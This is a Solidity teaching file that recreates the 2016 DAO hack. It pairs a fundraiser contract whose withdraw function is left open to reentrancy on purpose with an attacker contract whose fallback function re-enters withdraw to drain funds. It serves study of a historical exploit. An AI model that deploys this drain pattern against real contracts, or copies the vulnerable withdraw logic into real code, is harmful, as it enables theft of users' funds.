/*
// SPDX-License-Identifier: MIT

*******************************************************************************************************************
DAO HACK by Don Huey
*******************************************************************************************************************
Purpose:

The purpose of this exercise is to replicate the functions that caused the DAO hack that occurred 
in 2016 against the SlockIt developed DAO.

*******************************************************************************************************************
DAO Contract:

Below is a smart contract that will act as a fund raiser where people can submit funds
but also withdraw funds at their leisure.

This smart contract will contain a withdraw function that will contain the recursive reentracny
vulnerability performed on the DAO
*******************************************************************************************************************
Attacker:

Also below, a second smart contract will act as the attacking contract meant to drain the funds in the DAO

*/

pragma solidity ^0.4.8;

contract DAO {


    // Balance mapping
    mapping (address => uint256) balances;

    // Contribution function 
    function contribute() public payable{
        balances[msg.sender] += msg.value;

    }

    // Withdraw function structure replicated to match the DAO's vulnerability
    function withdraw() public payable{
        if(balances[msg.sender] == 0){
           throw;
        }


        if(msg.sender.call.value(balances[msg.sender])()){
    // This code would never run in the event of a recursive reentrancy attack
            balances[msg.sender] = 0;
        }
        else{
            throw;
        }
    }

    // This function will return the balance of our contract
    function getFunds() public returns (uint256){
        return address(this).balance;
    }

    function getMyBalance() public returns(uint256){
        return balances[msg.sender];
    }



}


contract Attacker {

    address public DAOaddress;

    // Variable used to define the amount of loops, we have to define this because of gas limits. The transaction will reverse if failed.
    uint public drainTimes = 0;

    
    function AttackThisDAO(address victimDAO){
        DAOaddress = victimDAO;
    }

    function getVictim () returns (address){
        return DAOaddress;
    }

    function () external payable {
        if (drainTimes < 3){
            drainTimes ++;
            DAO(DAOaddress).withdraw();
        }
    }

    // This function will return the balance of our contract
    function getFunds() public returns (uint256){
        return address(this).balance;
    }


    function payMe() payable{
        DAO(DAOaddress).contribute.value(msg.value)();
    }

    function startHack(){
        DAO(DAOaddress).withdraw();
    }
}
